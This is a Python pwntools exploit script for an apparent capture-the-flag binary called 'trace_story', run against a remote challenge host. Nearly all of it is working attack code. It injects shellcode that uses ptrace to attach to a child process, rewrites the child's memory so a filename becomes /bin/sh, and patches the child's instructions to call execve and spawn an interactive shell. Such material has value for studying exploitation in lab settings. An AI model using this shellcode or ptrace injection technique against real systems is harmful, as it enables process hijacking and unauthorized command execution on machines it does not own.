#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

binary = context.binary = ELF('./trace_story', checksec=False)

while True:
	if args.REMOTE:
		p = remote('0.cloud.chals.io', 15148)
		online = 1
	else:
		p = process(binary.path)
		online = 0

	p.recvuntil(b'child pid: ')
	pid = int(p.recvline().strip().decode(),10)

	if pid & 1 == 0: break
	if not args.REMOTE: break

	# hack, force new connection to shake things up and perhaps get even on next attemp
	if 's' in locals(): s.close()
	s = remote('0.cloud.chals.io', 15148)
	log.info('PID {x} is not even, starting over...'.format(x = pid))
	p.close()

# use ptrace to patch out right after read to just call puts
'''
  4017fd:   e8 de f9 ff ff          call   4011e0 <read@plt>

  401802:   48 89 85 e8 ef ff ff    mov    QWORD PTR [rbp-0x1018],rax
  401809:   48 83 bd e8 ef ff ff    cmp    QWORD PTR [rbp-0x1018],0x0
  401810:   00
  401811:   75 1e                   jne    401831 <read_story+0xcf>
  401813:   8b 05 9f 28 00 00       mov    eax,DWORD PTR [rip+0x289f]        # 4040b8 <debug>
  401819:   85 c0                   test   eax,eax
  40181b:   74 0a                   je     401827 <read_story+0xc5>
  40181d:   bf 39 20 40 00          mov    edi,0x402039

  401822:   e8 49 f9 ff ff          call   401170 <puts@plt>
'''

# also patch out exit after puts
'''
  401827:	bf 01 00 00 00       	mov    edi,0x1
  40182c:	e8 0f fa ff ff       	call   401240 <exit@plt>
'''

# shellz
patch = asm(
f'''
mov rdi, {binary.search(b'readstory.txt').__next__()}
xor rsi, rsi
xor rdx, rdx
mov rax, {constants.SYS_execve}
syscall
''')

patch += (0x401822 - 0x401802 - len(patch)) * asm('nop')
assert(len(patch) == 32)
patches = [ u64(bytes(patch[i*8:(i+1)*8])) for i in range(4) ]

PTRACE_ATTACH = 16
PTRACE_POKETEXT = 4
PTRACE_POKEDATA = 5
PTRACE_DETACH = 17
addr = 0x401802
addr_exit = 0x401827

payload = asm(
f'''
mov rdi, {PTRACE_ATTACH}
mov rsi, {pid}
xor rdx, rdx
xor r10, r10
mov rax, {constants.SYS_ptrace}
syscall

/* sleep(<=1) */
mov rdi, {binary.bss() + 0x100}
xor rsi, rsi
mov rax, {constants.SYS_gettimeofday}
syscall

mov rdx, rdi
mov rdi, {binary.bss() + 0x110}
loop:
mov rax, {constants.SYS_gettimeofday}
syscall
mov rax, [rdi]
sub rax, [rdx]
je loop

/* /bin/sh as readstory.txt */
mov rdi, {PTRACE_POKETEXT}
mov rsi, {pid}
mov rdx, {binary.search(b'readstory.txt').__next__()}
mov r10, {'0x' + hexlify(b'/bin/sh'[::-1]).decode()}
mov rax, {constants.SYS_ptrace}
syscall

/* patch */
mov rdx, {addr}
mov r10, {patches[0]}
mov rax, {constants.SYS_ptrace}
syscall

add rdx, 8
mov r10, {patches[1]}
mov rax, {constants.SYS_ptrace}
syscall

add rdx, 8
mov r10, {patches[2]}
mov rax, {constants.SYS_ptrace}
syscall

add rdx, 8
mov r10, {patches[3]}
mov rax, {constants.SYS_ptrace}
syscall

/* patch out even pid check, does not work remotely */
.if {online} == 0
mov rdx, {0x40179d}
mov rax, {constants.SYS_ptrace}
syscall
.endif

mov rdi, {PTRACE_DETACH}
xor rdx, rdx
xor r10, r10
mov rax, {constants.SYS_ptrace}
syscall

jmp $
''')

assert(len(payload) < 0x1ff)

log.info('child pid: {x}'.format(x = pid))
if not args.REMOTE:
	open('ppid','w').write(str(p.pid))
	open('pid','w').write(str(pid))

p.sendlineafter(b'Input: \n', payload)
p.interactive()
